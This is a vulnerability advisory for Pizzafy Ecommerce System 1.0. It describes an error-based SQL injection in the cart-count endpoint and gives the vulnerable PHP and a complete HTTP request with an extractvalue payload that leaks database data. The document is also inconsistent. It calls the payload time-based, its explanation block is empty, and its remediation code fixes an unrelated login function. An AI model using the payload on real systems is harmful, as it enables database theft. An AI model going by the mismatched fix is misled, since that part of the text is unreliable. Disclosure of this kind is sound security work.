
## **Affected Version:**  
- **Pizzafy Ecommerce System**: 1.0  

## **Vulnerability Information:**  
- **Vulnerability Type:** SQL Injection (Based Error)  
- **Severity:** HIGH  
- **Status:** Unpatched  

## **Vulnerable Endpoint:**  
- `GET /pizza/admin/ajax.php?action=get_cart_count&id=1`

## **Overview**
The Pizzafy Ecommerce System 1.0 contains critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.

## **Vulnerability Description:**  
# Error-Based SQL Injection Vulnerability in SELECT Operation

## Vulnerability Description

A **Error-based SQL Injection vulnerability** was discovered in the **select count functionality** of the **Pizzafy Ecommerce System 1.0**. This vulnerability occurs because the `id` parameter and `user_id` column database is not properly sanitized, allowing an attacker to inject malicious SQL commands into the backend database query.

## Attack Technique

This attack relies on **Error-based SQL injection technique**, where the attacker uses functions to force the database to return sensitive data within error messages. When the system displays database errors, the attacker can:

- **Extract database names, table names, and column structures**
- **Retrieve usernames and password hashes**
- **Delete or manipulate sensitive records**
- **Escalate privileges through session data extraction**


## Impact

| Impact | Description |
|--------|-------------|
| **Confidentiality** | Full database schema and user credentials exposure |
| **Integrity** | Unauthorized deletion or modification of records |
| **Availability** | Mass deletion causing denial of service |
| **Privilege Escalation** | Session hijacking and administrative access |

## Proof of Concept (PoC)

### Vulnerable Code
```php
    public function get_cart_count() {
    if(!isset($_SESSION['login_user_id'])) return "0";
    
    $user_id = $_SESSION['login_user_id'];
    
    if (isset($_GET['id'])) {
        $user_id = $_GET['id'];            
    }
    
     $sql = "SELECT SUM(qty) as total FROM cart WHERE user_id = $user_id";
    $result = $this->conn->query($sql);    
    
    if (!$result) {    
        return $this->conn->error;
    }

    if($result && $result->num_rows > 0) {
        $row = $result->fetch_assoc();
        
 
        if(!is_numeric($row['total'])) {
            return json_encode($row);
        }
        
        return $row['total'] ? (string)$row['total'] : "0";
    }
    
    return "0";
}
```

Below is a **GET** request demonstrating the vulnerability using a **time-based SQL injection payload**:  

```
GET /pizza/admin/ajax.php?action=get_cart_count&id=1%20and%20extractvalue(1,%20concat(0x7e,%20version()))%20-- HTTP/1.1
Host: localhost
sec-ch-ua: 
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
sec-ch-ua-platform: ""
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/pizza/index.php?page=home
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=b194kji2avnd4ra10063quhrp5
Connection: close
Content-Length: 0
```

### **Explanation:**  
This payload injects the SQL command:  

```sql

```
This makes it possible to get data from the database.

---

## Image

- ![](https://i.imgur.com/p6DsCfE.png)
---

## Remediation
```php
public function login() {
    
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';    
    
     $stmt = $this->conn->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $qry = $stmt->get_result();
    
    if(!$qry) {    
        return $this->conn->error;
    }
    
    if($qry && $qry->num_rows > 0) {
        
        $row = $qry->fetch_assoc();        
        
        if(password_verify($password, $row['password'])) {
            $_SESSION['login_id'] = $row['id'];
            $_SESSION['login_name'] = $row['name'];
            $_SESSION['login_type'] = $row['type'];
            return 1;
        }
        
        return 2;
        
    } else {
        return 2;
    }
}
```

---

## **Mitigation Recommendations:**  
1. **Use Prepared Statements:** Employ parameterized queries to prevent SQL injection.  
2. **Input Validation:** Validate and sanitize the `username` and `password` parameter to allow only expected values.  
3. **Database Permissions:** Restrict database user privileges to limit the potential damage of SQL injections.  
4. **Monitoring & Logging:** Track and alert unusual patterns, such as slow queries or repetitive access attempts.  
5. **Security Testing:** Perform regular penetration testing and code reviews to identify and mitigate vulnerabilities.  
6. **Error Handling:** Avoid exposing database-related errors in responses, which may assist attackers.

## References
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **OWASP:** SQL Injection Prevention Cheat Sheet